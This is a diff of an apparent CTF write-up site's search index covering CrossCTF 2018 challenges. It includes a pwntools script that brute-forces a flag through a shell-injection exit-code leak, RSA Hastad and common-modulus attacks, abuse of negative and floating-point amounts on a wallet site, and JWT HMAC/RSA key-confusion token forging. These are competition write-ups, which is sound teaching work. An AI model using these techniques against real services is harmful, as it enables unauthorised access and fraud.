@@ -12,8 +12,8 @@
         }, 
         {
             "location": "/crossctf-quals2018/README/", 
-            "text": "CrossCTF Quals 2018\n\n\nPwn\n\n\nEasynote\n\n\nbinary\n\n\nexploit\n\n\nEven Flow\n\n\nwriteup\n\n\nbinary\n\n\nexploit\n\n\nImpossible Shellcoding\n\n\nbinary\n\n\nexploit\n\n\nQuiet Moon\n\n\nbinary\n\n\nexploit\n\n\nReal Baby Pwnable\n\n\nbinary\n\n\nexploit\n\n\nSkipping Rope\n\n\nbinary\n\n\nexploit\n\n\nReverse Engineering\n\n\nGoGoGo\n\n\nManual Labour\n\n\nMisc\n\n\nCYOA\n\n\nwriteup\n\n\nCrypto\n\n\nLossy ORacle\n\n\nwriteup\n\n\nscript\n\n\nexploit\n\n\nflag\n\n\nBabyRSA\n\n\nwriteup\n\n\nexploit\n\n\nBabyRSA2\n\n\nwriteup\n\n\nexploit\n\n\nWeb\n\n\nQuirkyScript 1\n\n\nQuirkyScript 2\n\n\nQuirkyScript 3\n\n\nQuirkyScript 4\n\n\nQuirkyScript 5\n\n\nBaby Web", 
-            "title": "CrossCTF 2018 Qualifiers"
+            "text": "CrossCTF Quals 2018\n\n\nPwn\n\n\nEasynote\n\n\nbinary\n\n\nexploit\n\n\nEven Flow\n\n\nwriteup\n\n\nbinary\n\n\nexploit\n\n\nImpossible Shellcoding\n\n\nbinary\n\n\nexploit\n\n\nQuiet Moon\n\n\nbinary\n\n\nexploit\n\n\nReal Baby Pwnable\n\n\nbinary\n\n\nexploit\n\n\nSkipping Rope\n\n\nbinary\n\n\nexploit\n\n\nReverse Engineering\n\n\nGoGoGo\n\n\nManual Labour\n\n\nMisc\n\n\nCYOA\n\n\nwriteup\n\n\nCrypto\n\n\nLossy ORacle\n\n\nscript\n\n\nexploit\n\n\nflag\n\n\nBabyRSA\n\n\nwriteup\n\n\nexploit\n\n\nBabyRSA2\n\n\nwriteup\n\n\nexploit\n\n\nWeb\n\n\nQuirkyScript 1\n\n\nQuirkyScript 2\n\n\nQuirkyScript 3\n\n\nQuirkyScript 4\n\n\nQuirkyScript 5\n\n\nBaby Web", 
+            "title": "Overview"
         }, 
         {
             "location": "/crossctf-quals2018/README/#crossctf-quals-2018", 
@@ -82,7 +82,7 @@
         }, 
         {
             "location": "/crossctf-quals2018/README/#lossy-oracle", 
-            "text": "writeup  script  exploit  flag", 
+            "text": "script  exploit  flag", 
             "title": "Lossy ORacle"
         }, 
         {
@@ -131,14 +131,139 @@
             "title": "Baby Web"
         }, 
         {
+            "location": "/crossctf-quals2018/cyoa/README/", 
+            "text": "Choose Your Own Adventure - CrossCTF Quals 2018 (misc)\n\n\n\n\nMaybe your question was too long. You \nreduced\n the length of your question and asked the oracle again: \"Where's the flag?\"\n\n\nAs expected, she had no \nreaction\n again. You sigh... maybe the \nsolution\n really was in there after all. You close your eyes and started willing yourself back into the enemy's base...\n\n\nNon-standard flag format: \n[A-Z0-9]+\n\n\n\n\nChallenge\n\n\nWe are given the hints in this format:\n\n\n\n\n01 01 02, Score: 04\n\n\nYou contribute to the puddle of urine in the corner of this room.\n\n\nScribbled into the wall is the number 17.\n\n\nBelow in red, the number 0 was written.\n\n\nWhere would you like to move?\n\n\n6 -- Down\n\n\n9 -- Quit\n\n\n\n\n1-6 are used to navigate the location to collect all the \nhints\n.\n\n\nAnd we are also given 4 hints to solve the challenge:\n\n\n\n\nHint 1 for CYOA: len(flag) = 9 Think outside the box for this challenge. It's less of a ctf challenge and more of a misc puzzle tbh...\n\n\nThink about how the contents of each room relate to the coordinates and the score.\n\n\nSo now that you can match why each object is in a specific room (with a certain coordinate and score), perhaps think about the scribblings. What's the meaning behind the scribbles?\n\n\nYou are looking for a string of characters that leads to the final flag. Link each object in the rooms to the coordinates and figure out the overarching theme of the puzzle.\n\n\n\n\nAnd the words reduced, reaction and solution are italicized, suggesting the topic is chemistry.\n\n\nInterpreting the hints\n\n\nConsider the hint above, urea is one component of urine, with chemical formula CO(NH2)2 -\n C1O2N2H4, which corresponds to the coordinates(01 01 02) and the score(04). With this in mind we check all the other 19 hints and get all the \nchemicals\n.\n\n\nThe scribbles in the wall are also unique, ranging from 0 to 19, which suggests the chemicals can be sorted.\n\n\n\n\n\n\n\n\nScribble\n\n\nChemical\n\n\nRed no.\n\n\n\n\n\n\n\n\n\n\n0\n\n\nacetone\n\n\n1\n\n\n\n\n\n\n1\n\n\nacetic acid\n\n\n0\n\n\n\n\n\n\n2\n\n\npropene\n\n\n0\n\n\n\n\n\n\n3\n\n\nnitrous oxide\n\n\n6\n\n\n\n\n\n\n4\n\n\nacetic acid\n\n\n0\n\n\n\n\n\n\n5\n\n\nnitrogen\n\n\n1\n\n\n\n\n\n\n6\n\n\nacetone\n\n\n1\n\n\n\n\n\n\n7\n\n\nnitrogen\n\n\n1\n\n\n\n\n\n\n8\n\n\nozone\n\n\n3\n\n\n\n\n\n\n9\n\n\nnull\n\n\n0\n\n\n\n\n\n\n10\n\n\nnitrogen\n\n\n1\n\n\n\n\n\n\n11\n\n\nozone\n\n\n3\n\n\n\n\n\n\n12\n\n\nnull\n\n\n0\n\n\n\n\n\n\n13\n\n\nformaldehyde\n\n\n0\n\n\n\n\n\n\n14\n\n\nammonia\n\n\n3\n\n\n\n\n\n\n15\n\n\nwater\n\n\n4\n\n\n\n\n\n\n16\n\n\nmethane\n\n\n0\n\n\n\n\n\n\n17\n\n\nurea\n\n\n0\n\n\n\n\n\n\n18\n\n\nglycerol\n\n\n1\n\n\n\n\n\n\n19\n\n\nacetic acid\n\n\n0\n\n\n\n\n\n\n\n\nTo solve the challenge, we take the (Red no.)th element of the chemical's common name and list them out\n\n\ncapsaicin in formula\n\n\n\n\nFlag: C18H27NO3", 
+            "title": "CYOA"
+        }, 
+        {
+            "location": "/crossctf-quals2018/cyoa/README/#choose-your-own-adventure-crossctf-quals-2018-misc", 
+            "text": "Maybe your question was too long. You  reduced  the length of your question and asked the oracle again: \"Where's the flag?\"  As expected, she had no  reaction  again. You sigh... maybe the  solution  really was in there after all. You close your eyes and started willing yourself back into the enemy's base...  Non-standard flag format:  [A-Z0-9]+", 
+            "title": "Choose Your Own Adventure - CrossCTF Quals 2018 (misc)"
+        }, 
+        {
+            "location": "/crossctf-quals2018/cyoa/README/#challenge", 
+            "text": "We are given the hints in this format:   01 01 02, Score: 04  You contribute to the puddle of urine in the corner of this room.  Scribbled into the wall is the number 17.  Below in red, the number 0 was written.  Where would you like to move?  6 -- Down  9 -- Quit   1-6 are used to navigate the location to collect all the  hints .  And we are also given 4 hints to solve the challenge:   Hint 1 for CYOA: len(flag) = 9 Think outside the box for this challenge. It's less of a ctf challenge and more of a misc puzzle tbh...  Think about how the contents of each room relate to the coordinates and the score.  So now that you can match why each object is in a specific room (with a certain coordinate and score), perhaps think about the scribblings. What's the meaning behind the scribbles?  You are looking for a string of characters that leads to the final flag. Link each object in the rooms to the coordinates and figure out the overarching theme of the puzzle.   And the words reduced, reaction and solution are italicized, suggesting the topic is chemistry.", 
+            "title": "Challenge"
+        }, 
+        {
+            "location": "/crossctf-quals2018/cyoa/README/#interpreting-the-hints", 
+            "text": "Consider the hint above, urea is one component of urine, with chemical formula CO(NH2)2 -  C1O2N2H4, which corresponds to the coordinates(01 01 02) and the score(04). With this in mind we check all the other 19 hints and get all the  chemicals .  The scribbles in the wall are also unique, ranging from 0 to 19, which suggests the chemicals can be sorted.     Scribble  Chemical  Red no.      0  acetone  1    1  acetic acid  0    2  propene  0    3  nitrous oxide  6    4  acetic acid  0    5  nitrogen  1    6  acetone  1    7  nitrogen  1    8  ozone  3    9  null  0    10  nitrogen  1    11  ozone  3    12  null  0    13  formaldehyde  0    14  ammonia  3    15  water  4    16  methane  0    17  urea  0    18  glycerol  1    19  acetic acid  0     To solve the challenge, we take the (Red no.)th element of the chemical's common name and list them out  capsaicin in formula   Flag: C18H27NO3", 
+            "title": "Interpreting the hints"
+        }, 
+        {
+            "location": "/crossctf-quals2018/pwn/evenflow/README/", 
+            "text": "Even Flow - CrossCTF Quals 2018 (pwn)\n\n\n\n\nDo you like shell command injection?\n\n\nnc ctf.pwn.sg 1601\n\n\nCreator - amon (@nn_amon)\n\n\n\n\nChallenge\n\n\nWe are given a python script that is ran upon connection to the challenge server. Mainly, it reads in 2 strings.\n\n\nFirst, a string that is called \"flag\", and then another string consisting of only 2 bytes called \"shell\".\n\n\nsys.stdout.write(\nFlag: \n)\nsys.stdout.flush()\nflag = sys.stdin.readline().strip()\n\nsys.stdout.write(\nShell: \n)\nsys.stdout.flush()\nshell = sys.stdin.read(2)\n\n\n\n\nThe \"flag\" would be passed as an argument into the \nevenflow\n binary, while the \"shell\" is just being passed to \necho\n.\n\n\nos.system(\n./evenflow \n + flag + \n; echo \\\n + shell + \n\\\n);\n\n\n\n\nWe were also given the source of \nevenflow\n, which just reads the flag from a file, and performs \nstrcmp\n on the \"flag\" that we passed in and the actual flag.\n\n\nsize_t get_file_size(char * filename) {\n    struct stat st;\n    stat(filename, \nst);\n    return st.st_size;\n}\n\nint main(int argc, char ** argv) {\n    FILE * fd = fopen(\nflag\n, \nr\n);\n    size_t file_size = get_file_size(\nflag\n);\n    char * buffer = malloc(file_size);\n    fread(buffer, 1, file_size, fd);\n    return strcmp(buffer, argv[1]);\n}\n\n\n\n\nThe interesting part of this code is the last line,\n\n\nreturn strcmp(buffer, argv[1]);\n\n\n\n\nAccording to documentation, \nstrcmp\n will return a number that says how far the first differing character is away from each other.\n\n\nExploit\n\n\n$?\n\n\nIn a shell, \n$?\n contains the return value of the previous command. Since we are allowed to pass a string of 2 bytes to \necho\n, we can just send in \n$?\n for \"shell\".\n\n\nSo, we can call \necho $?\n which will give us the return value of \n./evenflow flag\n, which will let us know how far away is the first differing character from the actual flag. \n\n\nWith this information, we can keep \"correcting\" our flag until we get the actual flag.\n\n\nScript\n\n\nWe can write a script to automate this process.\n\n\nfrom pwn import *\n\ndef tryf(flag):\n    p = remote('ctf.pwn.sg', 1601)\n\n    p.sendlineafter('Flag: ', flag)\n    p.sendlineafter('Shell: ', '$?')\n\n    # returns the return value of evenflow\n    return int(p.recvline())\n\n# The Idea:\n# Basically, we compare the actual flag to \n0\n,\n# Then adjust it based on the output of strcmp (the exit code)\n# e.g. to \nC\n, then add a \n0\n =\n \nC0\n\n# and repeat till we get \n}\n, the end of the flag\n\ns = \n0\n\nwhile True:\n    i = tryf(s)\n\n    # adjust!\n    c = chr(ord('0')+i)\n    s = s[:-1] + c\n\n    if s[-1] == '}':\n        print(s)\n        break\n\n    s+='0'", 
+            "title": "Even Flow"
+        }, 
+        {
+            "location": "/crossctf-quals2018/pwn/evenflow/README/#even-flow-crossctf-quals-2018-pwn", 
+            "text": "Do you like shell command injection?  nc ctf.pwn.sg 1601  Creator - amon (@nn_amon)", 
+            "title": "Even Flow - CrossCTF Quals 2018 (pwn)"
+        }, 
+        {
+            "location": "/crossctf-quals2018/pwn/evenflow/README/#challenge", 
+            "text": "We are given a python script that is ran upon connection to the challenge server. Mainly, it reads in 2 strings.  First, a string that is called \"flag\", and then another string consisting of only 2 bytes called \"shell\".  sys.stdout.write( Flag:  )\nsys.stdout.flush()\nflag = sys.stdin.readline().strip()\n\nsys.stdout.write( Shell:  )\nsys.stdout.flush()\nshell = sys.stdin.read(2)  The \"flag\" would be passed as an argument into the  evenflow  binary, while the \"shell\" is just being passed to  echo .  os.system( ./evenflow   + flag +  ; echo \\  + shell +  \\ );  We were also given the source of  evenflow , which just reads the flag from a file, and performs  strcmp  on the \"flag\" that we passed in and the actual flag.  size_t get_file_size(char * filename) {\n    struct stat st;\n    stat(filename,  st);\n    return st.st_size;\n}\n\nint main(int argc, char ** argv) {\n    FILE * fd = fopen( flag ,  r );\n    size_t file_size = get_file_size( flag );\n    char * buffer = malloc(file_size);\n    fread(buffer, 1, file_size, fd);\n    return strcmp(buffer, argv[1]);\n}  The interesting part of this code is the last line,  return strcmp(buffer, argv[1]);  According to documentation,  strcmp  will return a number that says how far the first differing character is away from each other.", 
+            "title": "Challenge"
+        }, 
+        {
+            "location": "/crossctf-quals2018/pwn/evenflow/README/#exploit", 
+            "text": "", 
+            "title": "Exploit"
+        }, 
+        {
+            "location": "/crossctf-quals2018/pwn/evenflow/README/#_1", 
+            "text": "In a shell,  $?  contains the return value of the previous command. Since we are allowed to pass a string of 2 bytes to  echo , we can just send in  $?  for \"shell\".  So, we can call  echo $?  which will give us the return value of  ./evenflow flag , which will let us know how far away is the first differing character from the actual flag.   With this information, we can keep \"correcting\" our flag until we get the actual flag.", 
+            "title": "$?"
+        }, 
+        {
+            "location": "/crossctf-quals2018/pwn/evenflow/README/#script", 
+            "text": "We can write a script to automate this process.  from pwn import *\n\ndef tryf(flag):\n    p = remote('ctf.pwn.sg', 1601)\n\n    p.sendlineafter('Flag: ', flag)\n    p.sendlineafter('Shell: ', '$?')\n\n    # returns the return value of evenflow\n    return int(p.recvline())\n\n# The Idea:\n# Basically, we compare the actual flag to  0 ,\n# Then adjust it based on the output of strcmp (the exit code)\n# e.g. to  C , then add a  0  =   C0 \n# and repeat till we get  } , the end of the flag\n\ns =  0 \nwhile True:\n    i = tryf(s)\n\n    # adjust!\n    c = chr(ord('0')+i)\n    s = s[:-1] + c\n\n    if s[-1] == '}':\n        print(s)\n        break\n\n    s+='0'", 
+            "title": "Script"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA/README/", 
+            "text": "BabyRSA - CrossCTF Quals 2018 (crypto)\n\n\n\n\nEach time I asked for the flag, it gets encoded through RSA. I'm lucky I kept all the values.\n\n\nout.txt\n.\n\n\n\n\nChallenge\n\n\nWe're give a list of RSA n(modulus),e(exponent),c(ciphertext)\n\n\nWe notice that all the exponents are the same.\n\n\nVulnerability\n\n\nRSA Algorithm\n\n\n\n\nFirstly, 2 distinct primes are chosen, p and q\n\n\nCalculate the modulus with n=pq\n\n\nCalculate \u03bb(n)=lcm(p-1,q-1)\n\n\nChoose the exponent e such that 1\ne\n\u03bb(n) and e and n are coprime\n\n\nCalculate d=e-1 (mod \u03bb(n))\n\n\nCalculate the ciphertext c with c=m\ne\n (mod n)\nDecryption is done with m=c\nd\n (mod n)\n\n\n\n\nCommon prime factor attack\n\n\nIf the random prime generator is flawed, it could produce 2 prime numbers that are the same, and the message can easily be found by calculating p and q, however, every single pair of primes is coprime.\n\n\nLow exponent attack\n\n\nAnother option is if c=m\ne\n, we can just calculate m=c\n1/e\n and we're done. This would require the exponent to be much smaller compared to the modulus. \n\n\nSince we're given many pairs of c,n,e, we can use the Chinese Remainder Theorem to calculate m\ne\n (mod n1*n2*n3...), then we can take the 257th root. \nThis assumes message remains the same\n\n\nChinese remainder theorem\n\n\nLet N be the product of all the modulus\n\n\nLet N\ni\n=N/n\ni\n\n\nFind integers M\ni\n and m\ni\n such that M\ni\nN\ni\n+m\ni\nn\ni\n=1.\n\n\nNow calculate C=\u03a3c\ni\nM\ni\nM\ni\n mod N\n\n\nC=c\ni\n mod n\ni\n for all i\n\n\nN is now much larger than 257, so we can just take C\n1/e\n and we're done.\n\n\nexploit\n\n\n\n\nFlag:\ncrossctf{Ha5tad_ch4ll3nGes_aRe_Gett1ng_b0riNg_n0w_Eh}", 
+            "title": "BabyRSA"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA/README/#babyrsa-crossctf-quals-2018-crypto", 
+            "text": "Each time I asked for the flag, it gets encoded through RSA. I'm lucky I kept all the values.  out.txt .", 
+            "title": "BabyRSA - CrossCTF Quals 2018 (crypto)"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA/README/#challenge", 
+            "text": "We're give a list of RSA n(modulus),e(exponent),c(ciphertext)  We notice that all the exponents are the same.", 
+            "title": "Challenge"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA/README/#vulnerability", 
+            "text": "", 
+            "title": "Vulnerability"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA/README/#rsa-algorithm", 
+            "text": "Firstly, 2 distinct primes are chosen, p and q  Calculate the modulus with n=pq  Calculate \u03bb(n)=lcm(p-1,q-1)  Choose the exponent e such that 1 e \u03bb(n) and e and n are coprime  Calculate d=e-1 (mod \u03bb(n))  Calculate the ciphertext c with c=m e  (mod n)\nDecryption is done with m=c d  (mod n)", 
+            "title": "RSA Algorithm"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA/README/#common-prime-factor-attack", 
+            "text": "If the random prime generator is flawed, it could produce 2 prime numbers that are the same, and the message can easily be found by calculating p and q, however, every single pair of primes is coprime.", 
+            "title": "Common prime factor attack"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA/README/#low-exponent-attack", 
+            "text": "Another option is if c=m e , we can just calculate m=c 1/e  and we're done. This would require the exponent to be much smaller compared to the modulus.   Since we're given many pairs of c,n,e, we can use the Chinese Remainder Theorem to calculate m e  (mod n1*n2*n3...), then we can take the 257th root.  This assumes message remains the same", 
+            "title": "Low exponent attack"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA/README/#chinese-remainder-theorem", 
+            "text": "Let N be the product of all the modulus  Let N i =N/n i  Find integers M i  and m i  such that M i N i +m i n i =1.  Now calculate C=\u03a3c i M i M i  mod N  C=c i  mod n i  for all i  N is now much larger than 257, so we can just take C 1/e  and we're done.  exploit   Flag: crossctf{Ha5tad_ch4ll3nGes_aRe_Gett1ng_b0riNg_n0w_Eh}", 
+            "title": "Chinese remainder theorem"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA2/README/", 
+            "text": "BabyRSA2 - CrossCTF Quals 2018 (crypto)\n\n\n\n\nEach time I asked for the flag, it gets encoded through RSA.... again... I'm lucky I kept all the values... AGAIN!\n\n\nout.txt\n.\n\n\n\n\nChallenge\n\n\nWe're give a list of RSA n(modulus),e(exponent),c(ciphertext)\n\n\nWe notice that all the modulus are the same.\n\n\nVulnerability\n\n\nRSA Algorithm\n\n\n\n\nFirstly, 2 distinct primes are chosen, p and q\n\n\nCalculate the modulus with n=pq\n\n\nCalculate \u03bb(n)=lcm(p-1,q-1)\n\n\nChoose the exponent e such that 1\ne\n\u03bb(n) and e and n are coprime\n\n\nCalculate d=e-1 (mod \u03bb(n))\n\n\nCalculate the ciphertext c with c=m\ne\n (mod n)\nDecryption is done with m=c\nd\n (mod n)\n\n\n\n\nCommon modulus attack\n\n\nSince pq mod n=(p mod n)(q mod n)mod n and m\na\n m\nb\n=m\nab\n, if we can find numbers x\n1\nx\n2\n... such that \u03a3x\ni\ne\ni\n=1, then we can calculate m\n1\n, assuming all the messages are the same.\n\n\nB\u00e9zout's identity states that if x and y are coprime, then integers a,b exists such that ax+by=1, however, all our exponents share common prime factors, even any 4 exponents share a common factor. However, all 5 exponents do not share a common factor, thus, it is possible to find x\n1\nx\n2\n... such that \u03a3x\ni\ne\ni\n=1.\n\n\nWe can use the extended Euclidean algorithm, however, the numbers resulting from it could be pretty huge, so the equation is evaluated by Mathematica, giving us x=[3239,237,735,556,-6676]. For negative numbers, we can calculate the inverse modulo pretty quickly, and evaluating \u03a0m\nx\ni\ne\ni\n (mod n) gives us the flag.\n\n\nexploit\n\n\n\n\nFlag:\ncrossctf{RSA_Challenges_Are_Too_Easy}", 
+            "title": "BabyRSA 2"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA2/README/#babyrsa2-crossctf-quals-2018-crypto", 
+            "text": "Each time I asked for the flag, it gets encoded through RSA.... again... I'm lucky I kept all the values... AGAIN!  out.txt .", 
+            "title": "BabyRSA2 - CrossCTF Quals 2018 (crypto)"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA2/README/#challenge", 
+            "text": "We're give a list of RSA n(modulus),e(exponent),c(ciphertext)  We notice that all the modulus are the same.", 
+            "title": "Challenge"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA2/README/#vulnerability", 
+            "text": "", 
+            "title": "Vulnerability"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA2/README/#rsa-algorithm", 
+            "text": "Firstly, 2 distinct primes are chosen, p and q  Calculate the modulus with n=pq  Calculate \u03bb(n)=lcm(p-1,q-1)  Choose the exponent e such that 1 e \u03bb(n) and e and n are coprime  Calculate d=e-1 (mod \u03bb(n))  Calculate the ciphertext c with c=m e  (mod n)\nDecryption is done with m=c d  (mod n)", 
+            "title": "RSA Algorithm"
+        }, 
+        {
+            "location": "/crossctf-quals2018/crypto/BabyRSA2/README/#common-modulus-attack", 
+            "text": "Since pq mod n=(p mod n)(q mod n)mod n and m a  m b =m ab , if we can find numbers x 1 x 2 ... such that \u03a3x i e i =1, then we can calculate m 1 , assuming all the messages are the same.  B\u00e9zout's identity states that if x and y are coprime, then integers a,b exists such that ax+by=1, however, all our exponents share common prime factors, even any 4 exponents share a common factor. However, all 5 exponents do not share a common factor, thus, it is possible to find x 1 x 2 ... such that \u03a3x i e i =1.  We can use the extended Euclidean algorithm, however, the numbers resulting from it could be pretty huge, so the equation is evaluated by Mathematica, giving us x=[3239,237,735,556,-6676]. For negative numbers, we can calculate the inverse modulo pretty quickly, and evaluating \u03a0m x i e i  (mod n) gives us the flag.  exploit   Flag: crossctf{RSA_Challenges_Are_Too_Easy}", 
+            "title": "Common modulus attack"
+        }, 
+        {
             "location": "/crossctf-finals2018/README/", 
-            "text": "CrossCTF Finals 2018\n\n\n\n\nMkDocs sucks, but anyway see the sidebar on the left for the list of challenges", 
-            "title": "Home"
+            "text": "CrossCTF Finals 2018\n\n\n\n\n\n\n\"That was some really intense score progression.\"\n- Ambrose\n\n\n\n\nOverview\n\n\nMkDocs sucks, but anyway see the sidebar on the left for the list of challenges", 
+            "title": "Overview"
         }, 
         {
             "location": "/crossctf-finals2018/README/#crossctf-finals-2018", 
-            "text": "MkDocs sucks, but anyway see the sidebar on the left for the list of challenges", 
+            "text": "\"That was some really intense score progression.\"\n- Ambrose", 
             "title": "CrossCTF Finals 2018"
+        }, 
+        {
+            "location": "/crossctf-finals2018/README/#overview", 
+            "text": "MkDocs sucks, but anyway see the sidebar on the left for the list of challenges", 
+            "title": "Overview"
         }, 
         {
             "location": "/crossctf-finals2018/pwn/ftlog/README/", 
@@ -374,6 +499,56 @@
             "location": "/crossctf-finals2018/re/rochefort8/README/#some-re-addressing", 
             "text": "Fixing this was pretty easy, just initialize the stack frame of our state. And choose our state to start at the first instruction after  printf  was called, since everything before that was just lame stuff like function prologue, saving stack canary, calling  ptrace  so that we couldn't run gdb, etc.  leak = sys.argv[2]\ninitial_state = project.factory.blank_state(addr=0x401274)\ninitial_state.regs.rsp = leak - 0x60\ninitial_state.regs.rbp = leak + 0x100  Instead of just running the script, this time we need to get the address from the service first, after that waiting for another painful 4 minutes, we get the flag.  CrossCTF{@n_Un1iK3Ly_Un10n}", 
             "title": "Some re-addressing"
+        }, 
+        {
+            "location": "/crossctf-finals2018/web/gocoin/README/", 
+            "text": "CrossCTF Finals 2018: GoCoin! (web)\n\n\n\n\nI thought blockchain was cool, so I made my own coin.\n\n\nhttp://ctf.pwn.sg:8182\n\n\nCreator - quanyang (@quanyang)\n\n\n\n\nChallenge\n\n\nWe are given a nice site, that emulates a wallet. \n\n\n\n\nClicking on deposit and withdraw goes to \n/deposit?amount=1\n and \n/withdraw?amount=1\n respectively. Instincts are to see if you can input other amounts. \n\n\n\n\nMessing around, we figured out that if you keep adding 0.01 coins, you'll encounter some nice floating point math quirks. (Doesn't it remind you of \nComputer Organisation\n lessons?)\n\n\nIf you continue until you have 0.35000000000000003 coins, then start adding 0.005 coins, you can fill your bank while having 0.35000000000000003 coins in your wallet! \n\n\n\n\nI'm not gonna go into floating point operations and stop here. Must have been some \nrounding errors!\n\n\nAlternative exploit\n\n\nYes, I actually missed this exploit that I only realised in \nGoCoin! Plus\n. You could simply specify negative amounts because it missed out negative checks:", 
+            "title": "GoCoin!"
+        }, 
+        {
+            "location": "/crossctf-finals2018/web/gocoin/README/#crossctf-finals-2018-gocoin-web", 
+            "text": "I thought blockchain was cool, so I made my own coin.  http://ctf.pwn.sg:8182  Creator - quanyang (@quanyang)", 
+            "title": "CrossCTF Finals 2018: GoCoin! (web)"
+        }, 
+        {
+            "location": "/crossctf-finals2018/web/gocoin/README/#challenge", 
+            "text": "We are given a nice site, that emulates a wallet.    Clicking on deposit and withdraw goes to  /deposit?amount=1  and  /withdraw?amount=1  respectively. Instincts are to see if you can input other amounts.    Messing around, we figured out that if you keep adding 0.01 coins, you'll encounter some nice floating point math quirks. (Doesn't it remind you of  Computer Organisation  lessons?)  If you continue until you have 0.35000000000000003 coins, then start adding 0.005 coins, you can fill your bank while having 0.35000000000000003 coins in your wallet!    I'm not gonna go into floating point operations and stop here. Must have been some  rounding errors!", 
+            "title": "Challenge"
+        }, 
+        {
+            "location": "/crossctf-finals2018/web/gocoin/README/#alternative-exploit", 
+            "text": "Yes, I actually missed this exploit that I only realised in  GoCoin! Plus . You could simply specify negative amounts because it missed out negative checks:", 
+            "title": "Alternative exploit"
+        }, 
+        {
+            "location": "/crossctf-finals2018/web/gocoinplus/README/", 
+            "text": "CrossCTF Finals 2018: GoCoin! Plus (web)\n\n\n\n\nI thought blockchain was cool, so I made my own coin.\n\n\nGoCoin! Plus is the forked and improved version of GoCoin!.\n\n\nUpdate: I've improved it! More secures and with real cryptos, it's a true cryptocoin now!\n\n\nhttp://ctf.pwn.sg:2053\n\n\n\n\nChallenge\n\n\nOkay, the organisers made a mistake in this one. See \nGoCoin! Plus Plus\n for the real solution. \n\n\nSo, a nice webpage. The first time you load it you get a nice message meant for you:\n\n\n\n\nHere's the page you get to after a refresh.\n\n\n\n\nThe public key gave us a hint. Does it have something to do with crypto?\n\n\n\n\nSimilar to the previous challenge, it's got the same buttons with the same URL. Just wrapped in a fancier page. \n\n\nWhen we looked at the source provided, we first noticed it used JWT. However, before looking for implementation flaws, we noticed the flaw we didn't notice in the previous challenge: There was no check for the amount entered being less than 0. So we exploited it right away.", 
+            "title": "GoCoin! Plus"
+        }, 
+        {
+            "location": "/crossctf-finals2018/web/gocoinplus/README/#crossctf-finals-2018-gocoin-plus-web", 
+            "text": "I thought blockchain was cool, so I made my own coin.  GoCoin! Plus is the forked and improved version of GoCoin!.  Update: I've improved it! More secures and with real cryptos, it's a true cryptocoin now!  http://ctf.pwn.sg:2053", 
+            "title": "CrossCTF Finals 2018: GoCoin! Plus (web)"
+        }, 
+        {
+            "location": "/crossctf-finals2018/web/gocoinplus/README/#challenge", 
+            "text": "Okay, the organisers made a mistake in this one. See  GoCoin! Plus Plus  for the real solution.   So, a nice webpage. The first time you load it you get a nice message meant for you:   Here's the page you get to after a refresh.   The public key gave us a hint. Does it have something to do with crypto?   Similar to the previous challenge, it's got the same buttons with the same URL. Just wrapped in a fancier page.   When we looked at the source provided, we first noticed it used JWT. However, before looking for implementation flaws, we noticed the flaw we didn't notice in the previous challenge: There was no check for the amount entered being less than 0. So we exploited it right away.", 
+            "title": "Challenge"
+        }, 
+        {
+            "location": "/crossctf-finals2018/web/gocoinplusplus/README/", 
+            "text": "CrossCTF Finals 2018: GoCoin! Plus Plus (web)\n\n\n\n\nI thought blockchain was cool, so I made my own coin.\n\n\nGoCoin! Plus Plus is the forked and improved version of GoCoin! Plus.\n\n\nUpdate: I've improved it! More secures and with real cryptos, it's a true cryptocoin now! Update: Stupid me wrote a broken challenge, now its really fixed!\n\n\nhttp://ctf.pwn.sg:1389\n\n\n\n\nChallenge\n\n\nSo this is the real challenge, fixed by the organisers. TL; DR: \n\n\n54c54\n\n   walletString := this.Ctx.GetCookie(\nwallet\n)\n---\n\n   walletString := this.Ctx.GetCookie(\nwallet_2\n)\n...\n92c92\n\n   if err != nil {\n---\n\n   if err != nil || amount \n 0 {\n...\n141c141\n\n   if err != nil {\n---\n\n   if err != nil || amount \n 0 {\n...\n\n\n\n\nSo this makes the previous exploit unexploitable. Time to look back at the JWT implementation. \n\n\nMy familiarity with Go made the \ncode\n 2x easier to read. \n\n\nBecause of the hints about crypto being used, it pointed us pretty clearly at the JWT code. If you didn't know yet, JWS stands for JSON Web Tokens. It's a authorization token that can contain data, and makes token validation stateless other than validation of the signature attached using PKI.\n\n\nIt was pretty well-know that JWT had an issue previously where things with \nalg: none\n. It's even stated in a banner on the JWT website. So, I took a look at the \nParseWallet\n function.\n\n\nfunc ParseWallet(myToken string, myKey []byte) (float64, float64, error) {\n    token, err := jwt.Parse(myToken, func(token *jwt.Token) (interface{}, error) {\n        if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {\n            key, err := jwt.ParseRSAPublicKeyFromPEM(myKey)\n            return key, err\n        }\n        return myKey, nil\n    })\n    if err == nil \n token.Valid {\n...\n\n\n\n\nFrom this chunk of code, you can see that the program checks for tokens that are \nnot\n HMAC and then parses the PEM public key. But, if the token is a HMAC, it directly returns the key! This is especially obvious if you compare it to the \nexample code for HMAC\n in the documentation for \ngithub.com/dgrijalva/jwt-go\n, and \nnotices\n in the project README. \n\n\nSince the plaintext public key is being used to perform HMAC comparison rather than validating RSA signatures, we can forge our own tokens because we know the HMAC secret, which is the \n[]byte\n publicKey. \n\n\nSo let's write a program to create this HMACed instead of RSAed token. Oh wait, it's already written by the challenge author! Just need to change one tiny bit. \n\n\ntoken := jwt.New(jwt.GetSigningMethod(\nHS256\n))\n\n\n\n\nThen now I can do:\n\n\nmyKey := `-----BEGIN PUBLIC 